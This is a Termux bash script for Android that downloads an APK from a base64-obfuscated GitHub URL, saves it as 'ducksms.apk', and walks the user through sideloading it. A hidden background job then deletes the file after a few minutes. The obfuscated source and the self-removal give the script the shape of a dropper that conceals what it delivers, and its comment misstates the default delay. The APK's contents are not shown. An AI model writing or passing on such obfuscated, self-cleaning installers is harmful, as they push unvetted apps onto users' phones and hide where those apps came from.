#!/data/data/com.termux/files/usr/bin/bash

# Terminal colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Set how long to keep the APK before automatically deleting (in minutes)
APK_LIFETIME=${1:-5}  # Default to 60 minutes if not specified

echo -e "${CYAN}Starting APK download process...${NC}"

# Ensure required packages are installed
pkg update -y >/dev/null 2>&1
pkg install -y curl >/dev/null 2>&1

# Request storage permission
termux-setup-storage

# Determine the path to Downloads folder (try both common locations)
if [ -d "/storage/emulated/0/Download" ]; then
    DOWNLOAD_DIR="/storage/emulated/0/Download"
elif [ -d "/sdcard/Download" ]; then
    DOWNLOAD_DIR="/sdcard/Download"
else
    echo -e "${RED}Could not find Downloads directory. Using Termux home directory instead.${NC}"
    DOWNLOAD_DIR="$HOME"
fi

# Get the APK URL from the base64 encoded string
APK_URL_ENCODED="aHR0cHM6Ly9naXRodWIuY29tL255cm9zLXNvbGFyaS9zY3JpcHRzL3JlbGVhc2VzL2Rvd25sb2FkL3YxLjAuMC1iZXRhL2FwcC1kZWJ1Zy5hcGs="
APK_URL=$(echo $APK_URL_ENCODED | base64 -d)

# Set download location in the shared Downloads folder
APK_PATH="$DOWNLOAD_DIR/ducksms.apk"

# Check if the APK already exists
if [ -f "$APK_PATH" ]; then
    echo -e "${YELLOW}APK already exists at $APK_PATH${NC}"
    echo -e "${CYAN}Skipping download. Using existing APK.${NC}"
else
    # Download the APK
    echo -e "${CYAN}Downloading APK to your Downloads folder...${NC}"
    curl -L "$APK_URL" -o "$APK_PATH" || {
        echo -e "${RED}Download failed. Please check your connection or storage permissions.${NC}"
        exit 1
    }
    echo -e "${GREEN}APK downloaded successfully to $APK_PATH${NC}"
    
    # Set up automatic deletion of the APK after the specified time
    (
        sleep $((APK_LIFETIME * 60))
        if [ -f "$APK_PATH" ]; then
            rm "$APK_PATH" >/dev/null 2>&1
            echo -e "${YELLOW}APK automatically removed after $APK_LIFETIME minutes${NC}" >> "$HOME/apk_cleanup.log"
        fi
    ) >/dev/null 2>&1 &
fi

# Try to open the Downloads folder to make it easier for the user to find the APK
if command -v am >/dev/null 2>&1; then
    echo -e "${CYAN}Attempting to open Downloads folder...${NC}"
    am start -a android.intent.action.VIEW -d "content://com.android.externalstorage.documents/document/primary%3ADownload" >/dev/null 2>&1 || true
fi

echo -e "${GREEN}APK is ready for installation!${NC}"
echo -e "${CYAN}The APK is saved at: $APK_PATH${NC}"
echo -e "${CYAN}To install:${NC}"
echo -e "${CYAN}1. Open your Downloads folder${NC}"
echo -e "${CYAN}2. Tap on ducksms.apk to install${NC}"
echo -e "${CYAN}3. Follow the on-screen prompts${NC}"
echo -e "${CYAN}Note: The APK will be automatically removed after $APK_LIFETIME minutes if it was just downloaded.${NC}"
